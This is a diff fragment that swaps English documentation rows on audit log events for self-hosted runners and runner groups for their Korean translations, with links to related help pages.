-| `enterprise.self_hosted_runner_offline` | Triggered when the runner application is stopped. Can only be viewed using the REST API; not visible in the UI or JSON/CSV export. For more information, see "[Checking the status of a self-hosted runner](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)."
-| `enterprise.self_hosted_runner_updated` | Triggered when the runner application is updated. Can be viewed using the REST API and the UI. This event is not included when you export the audit log as JSON data or a CSV file. For more information, see "[About self-hosted runners](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)" and "[Reviewing the audit log for your organization](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#exporting-the-audit-log)."
-| `org.register_self_hosted_runner` | Triggered when a new self-hosted runner is registered. For more information, see "[Adding a self-hosted runner to an organization](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-organization)."
-| `org.remove_self_hosted_runner` | Triggered when a self-hosted runner is removed. For more information, see [Removing a runner from an organization](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-an-organization).
-| `org.runner_group_runners_updated` | Triggered when a runner group's list of members is updated. For more information, see "[Set self-hosted runners in a group for an organization](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization)."
-| `org.runner_group_updated` | Triggered when the configuration of a self-hosted runner group is changed. For more information, see "[Changing the access policy of a self-hosted runner group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)."
-| `org.self_hosted_runner_online` | Triggered when the runner application is started. Can only be viewed using the REST API; not visible in the UI or JSON/CSV export. For more information, see "[Checking the status of a self-hosted runner](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)."
-| `org.self_hosted_runner_offline` | Triggered when the runner application is stopped. Can only be viewed using the REST API; not visible in the UI or JSON/CSV export. For more information, see "[Checking the status of a self-hosted runner](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)."
-| `org.self_hosted_runner_updated` | Triggered when the runner application is updated. Can be viewed using the REST API and the UI; not visible in the JSON/CSV export. For more information, see "[About self-hosted runners](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)."
-| `repo.register_self_hosted_runner` | Triggered when a new self-hosted runner is registered. For more information, see "[Adding a self-hosted runner to a repository](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-a-repository)."
-| `repo.remove_self_hosted_runner` | Triggered when a self-hosted runner is removed. For more information, see "[Removing a runner from a repository](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-a-repository)."
-| `repo.self_hosted_runner_online` | Triggered when the runner application is started. Can only be viewed using the REST API; not visible in the UI or JSON/CSV export. For more information, see "[Checking the status of a self-hosted runner](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)."
-| `repo.self_hosted_runner_offline` | Triggered when the runner application is stopped. Can only be viewed using the REST API; not visible in the UI or JSON/CSV export. For more information, see "[Checking the status of a self-hosted runner](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)."
-| `repo.self_hosted_runner_updated` | Triggered when the runner application is updated. Can be viewed using the REST API and the UI; not visible in the JSON/CSV export. For more information, see "[About self-hosted runners](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)."
+| `enterprise.register_self_hosted_runner` | 새 자체 호스팅 실행기를 등록할 때 트리거됩니다. 자세한 내용은 “[엔터프라이즈에 자체 호스트 실행기 추가](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-enterprise)”를 참조하세요.
+| `enterprise.remove_self_hosted_runner` | 자체 호스팅 실행기를 제거할 때 트리거됩니다.
+| `enterprise.runner_group_runners_updated` | 실행기 그룹의 멤버 목록이 업데이트될 때 트리거됩니다. 자세한 내용은 “[조직의 그룹에서 자체 호스트 실행기 설정](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization)”을 참조하세요.
+| `enterprise.self_hosted_runner_online` | 실행기 애플리케이션이 시작될 때 트리거됩니다. REST API를 사용해서만 볼 수 있습니다. UI 또는 JSON/CSV 내보내기에서 표시되지 않습니다. 자세한 내용은 “[자체 호스팅 실행기의 상태 검사](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)”를 참조하세요.
+| `enterprise.self_hosted_runner_offline` | 실행기 애플리케이션이 중지될 때 트리거됩니다. REST API를 사용해야만 볼 수 있으며 UI 또는 JSON/CSV 내보내기에 표시되지 않습니다. 자세한 내용은 “[자체 호스팅 실행기의 상태 검사](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)”를 참조하세요.
+| `enterprise.self_hosted_runner_updated` | 실행기 애플리케이션이 업데이트될 때 트리거됩니다. REST API 및 UI를 사용하여 볼 수 있습니다. 감사 로그를 JSON 데이터 또는 CSV 파일로 내보낼 때는 이 이벤트가 포함되지 않습니다. 자세한 내용은 “[자체 호스팅 실행기 정보](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)” 및 “[조직의 감사 로그 검토](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#exporting-the-audit-log)”를 참조하세요.
+| `org.register_self_hosted_runner` | 새 자체 호스팅 실행기를 등록할 때 트리거됩니다. 자세한 내용은 “[조직에 자체 호스트 실행기 추가](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-organization)”를 참조하세요.
+| `org.remove_self_hosted_runner` | 자체 호스팅 실행기를 제거할 때 트리거됩니다. 자세한 내용은 “[조직에서 실행기 제거](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-an-organization)”를 참조하세요.
+| `org.runner_group_runners_updated` | 실행기 그룹의 멤버 목록이 업데이트될 때 트리거됩니다. 자세한 내용은 “[조직의 그룹에서 자체 호스팅 실행기 설정](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization)”을 참조하세요.
+| `org.runner_group_updated` | 자체 호스팅 실행기 그룹의 구성이 변경될 때 트리거됩니다. 자세한 내용은 “[자체 호스팅 실행기 그룹의 액세스 정책 변경](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)”을 참조하세요.
+| `org.self_hosted_runner_online` | 실행기 애플리케이션이 시작될 때 트리거됩니다. REST API를 사용해서만 볼 수 있습니다. UI 또는 JSON/CSV 내보내기에서 표시되지 않습니다. 자세한 내용은 “[자체 호스팅 실행기의 상태 검사](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)”를 참조하세요.
+| `org.self_hosted_runner_offline` | 실행기 애플리케이션이 중지될 때 트리거됩니다. REST API를 사용해야만 볼 수 있으며 UI 또는 JSON/CSV 내보내기에 표시되지 않습니다. 자세한 내용은 “[자체 호스팅 실행기의 상태 검사](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)”를 참조하세요.
+| `org.self_hosted_runner_updated` | 실행기 애플리케이션이 업데이트될 때 트리거됩니다. REST API 및 UI를 사용하여 볼 수 있으며 JSON/CSV 내보내기에 표시되지 않습니다. 자세한 내용은 “[자체 호스트 실행기 정보](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)”를 참조하세요.
+| `repo.register_self_hosted_runner` | 새 자체 호스팅 실행기를 등록할 때 트리거됩니다. 자세한 내용은 “[리포지토리에 자체 호스트 실행기 추가](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-a-repository)”를 참조하세요.
+| `repo.remove_self_hosted_runner` | 자체 호스팅 실행기를 제거할 때 트리거됩니다. 자세한 내용은 “[리포지토리에서 실행기 제거](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-a-repository)”를 참조하세요.
+| `repo.self_hosted_runner_online` | 실행기 애플리케이션이 시작될 때 트리거됩니다. REST API를 사용해서만 볼 수 있습니다. UI 또는 JSON/CSV 내보내기에서 표시되지 않습니다. 자세한 내용은 “[자체 호스팅 실행기의 상태 검사](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)”를 참조하세요.
+| `repo.self_hosted_runner_offline` | 실행기 애플리케이션이 중지될 때 트리거됩니다. REST API를 사용해야만 볼 수 있으며 UI 또는 JSON/CSV 내보내기에 표시되지 않습니다. 자세한 내용은 “[자체 호스팅 실행기의 상태 검사](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)”를 참조하세요.
+| `repo.self_hosted_runner_updated` | 실행기 애플리케이션이 업데이트될 때 트리거됩니다. REST API 및 UI를 사용하여 볼 수 있으며 JSON/CSV 내보내기에 표시되지 않습니다. 자세한 내용은 “[자체 호스트 실행기 정보](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)”를 참조하세요.
 
-### Events for self-hosted runner groups
-| Action | Description
+### 자체 호스팅 실행기 그룹에 대한 이벤트
+| 작업 | 설명
 |------------------|-------------------
-| `enterprise.runner_group_created` | Triggered when a self-hosted runner group is created. For more information, see "[Creating a self-hosted runner group for an enterprise](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-enterprise)."
-| `enterprise.runner_group_removed` | Triggered when a self-hosted runner group is removed. For more information, see "[Removing a self-hosted runner group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group)."
-| `enterprise.runner_group_runner_removed` | Triggered when the REST API is used to remove a self-hosted runner from a group.
-| `enterprise.runner_group_runners_added` | Triggered when a self-hosted runner is added to a group. For more information, see "[Moving a self-hosted runner to a group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group)."
-| `enterprise.runner_group_updated` |Triggered when the configuration of a self-hosted runner group is changed. For more information, see "[Changing the access policy of a self-hosted runner group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)."
-| `org.runner_group_created` | Triggered when a self-hosted runner group is created. For more information, see "[Creating a self-hosted runner group for an organization](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-organization)."
-| `org.runner_group_removed` | Triggered when a self-hosted runner group is removed. For more information, see "[Removing a self-hosted runner group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group)."
-| `org.runner_group_updated` | Triggered when the configuration of a self-hosted runner group is changed. For more information, see "[Changing the access policy of a self-hosted runner group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)."
-| `org.runner_group_runners_added` | Triggered when a self-hosted runner is added to a group. For more information, see "[Moving a self-hosted runner to a group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group)."
-| `org.runner_group_runner_removed` | Triggered when the REST API is used to remove a self-hosted runner from a group. For more information, see "[Remove a self-hosted runner from a group for an organization](/rest/reference/actions#remove-a-self-hosted-runner-from-a-group-for-an-organization)."
+| `enterprise.runner_group_created` | 자체 호스팅 실행기 그룹을 만들 때 트리거됩니다. 자세한 내용은 “[엔터프라이즈의 자체 호스트 실행기 그룹 만들기](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-enterprise)”를 참조하세요.
+| `enterprise.runner_group_removed` | 자체 호스팅 실행기 그룹이 제거될 때 트리거됩니다. 자세한 내용은 “[자체 호스팅 실행기 그룹 제거](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group)”를 참조하세요.
+| `enterprise.runner_group_runner_removed` | REST API를 사용하여 그룹에서 자체 호스팅 실행기를 제거할 때 트리거됩니다.
+| `enterprise.runner_group_runners_added` | 자체 호스팅 실행기를 그룹에 추가할 때 트리거됩니다. 자세한 내용은 “[자체 호스팅 실행기를 그룹으로 이동](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group)”을 참조하세요.
+| `enterprise.runner_group_updated` |자체 호스팅 실행기 그룹의 구성이 변경될 때 트리거됩니다. 자세한 내용은 “[자체 호스팅 실행기 그룹의 액세스 정책 변경](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)”을 참조하세요.
+| `org.runner_group_created` | 자체 호스팅 실행기 그룹을 만들 때 트리거됩니다. 자세한 내용은 “[조직의 자체 호스트 실행기 그룹 만들기](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-organization)”를 참조하세요.
+| `org.runner_group_removed` | 자체 호스팅 실행기 그룹이 제거될 때 트리거됩니다. 자세한 내용은 “[자체 호스팅 실행기 그룹 제거](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group)”를 참조하세요.
+| `org.runner_group_updated` | 자체 호스팅 실행기 그룹의 구성이 변경될 때 트리거됩니다. 자세한 내용은 “[자체 호스팅 실행기 그룹의 액세스 정책 변경](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)”을 참조하세요.
+| `org.runner_group_runners_added` | 자체 호스팅 실행기를 그룹에 추가할 때 트리거됩니다. 자세한 내용은 “[자체 호스팅 실행기를 그룹으로 이동](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group)”을 참조하세요.
+| `org.runner_group_runner_removed` | REST API를 사용하여 그룹에서 자체 호스팅 실행기를 제거할 때 트리거됩니다. 자세한 내용은 “[조직의 그룹에서 자체 호스트 실행기 제거](/rest/reference/actions#remove-a-self-hosted-runner-from-a-group-for-an-organization)”를 참조하세요.
 
-### Events for workflow activities
+### 워크플로 활동에 대한 이벤트
 
 {% data reusables.actions.actions-audit-events-workflow %}
